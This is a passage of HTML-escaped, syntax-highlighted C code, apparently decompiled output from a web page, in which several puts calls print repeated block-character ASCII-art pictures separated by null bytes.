&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">1272&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▓▒▒▒▒▒░░░░░░░░░░▒▒▒▓▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▒▒▒▒▒▒░░░░░░░░░░░▒▒▒▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▒▒▒▒▒▒▒░░░░░░░░░░░▒▒▒▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
